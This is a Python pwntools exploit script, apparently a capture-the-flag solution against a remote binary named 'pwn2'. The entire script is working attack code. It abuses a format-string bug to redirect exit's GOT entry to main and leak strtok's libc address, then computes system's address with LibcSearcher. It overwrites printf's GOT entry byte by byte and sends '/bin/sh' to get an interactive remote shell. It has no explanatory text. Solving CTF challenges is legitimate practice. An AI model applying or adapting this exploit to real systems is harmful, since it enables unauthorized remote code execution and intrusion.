from pwn import *
from LibcSearcher import *
context(arch="amd64",os="linux",log_level="debug")
context.terminal = ['tmux','splitw','-h']
#p =process(argv=['./pwn2', "a.txt"])
p=remote("152.136.xx.97",20192)
#gdb.attach(p)
elf = ELF("./pwn2")
#libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
#libc = ELF("./libc.so.6")
printf_plt=elf.plt["printf"]
printf_got = elf.got["printf"]
exit_got = elf.got["exit"]
strlen_plt = elf.plt["strlen"]
strlen_got = elf.got["strlen"]
main_addr = 0x4009bd
print(hex(strlen_plt),hex(strlen_plt+6))
p.recvuntil("action: ")
payload="e "+"aa%"+str((main_addr&0xffff)-2)+"s%16$hn"+p64(exit_got)
p.sendline(payload)
p.recvuntil("action: ")
payload="e "+"a%15$s"+p64(elf.got["strtok"])
p.sendline(payload)
xx=p.recvuntil("action: ")

print(xx,"xx")
addr_leak = u64(xx[19:25]+'\x00\x00')
print(hex(addr_leak))
libc=LibcSearcher("strtok",addr_leak)
offset =addr_leak - libc.dump("strtok")
system_addr = offset + libc.dump("system")

print(hex(system_addr))

tlist=[]

for i in range(3):
    tlist.append(system_addr>>(8*i)&0xff)
if tlist[2]<tlist[1] or tlist[1]<tlist[0]:
    print("*"*10+"\r\n"+"Bad luck try again\r\n"+"*"*10)
    exit()
payload='%'+str(tlist[0])+'c%'+str(19)+"$hhn"
payload+='%'+str(tlist[1]-tlist[0])+'c%'+str(20)+"$hhn"
payload+='%'+str(tlist[2]-tlist[1])+'c%'+str(21)+"$hhn"
lenpayload=len(payload)
if lenpayload<38:
    payload+='a'*(38-lenpayload)
for i in range(3):
    payload+=p64(printf_got+i)
payload='e '+payload



p.sendline(payload)


p.sendline("e /bin/sh")

p.interactive()
